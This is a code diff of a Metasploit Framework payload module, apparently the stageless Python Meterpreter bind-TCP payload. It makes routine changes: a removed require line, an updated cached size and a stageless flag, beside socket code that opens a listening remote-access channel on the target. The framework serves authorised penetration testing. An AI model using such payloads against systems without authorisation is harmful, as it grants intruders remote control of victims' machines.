@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/handler/bind_tcp'
 require 'msf/core/payload/python'
 require 'msf/core/payload/python/meterpreter_loader'
@@ -12,7 +11,7 @@ require 'msf/base/sessions/meterpreter_python'
 
 module MetasploitModule
 
-  CachedSize = 51594
+  CachedSize = 54142
 
   include Msf::Payload::Single
   include Msf::Payload::Python
@@ -38,6 +37,7 @@ module MetasploitModule
     socket_setup << "bind_sock.listen(1)\n"
     socket_setup << "s, address = bind_sock.accept()\n"
     opts[:stageless_tcp_socket_setup] = socket_setup
+    opts[:stageless] = true
 
     met = stage_meterpreter(opts)
     py_create_exec_stub(met)
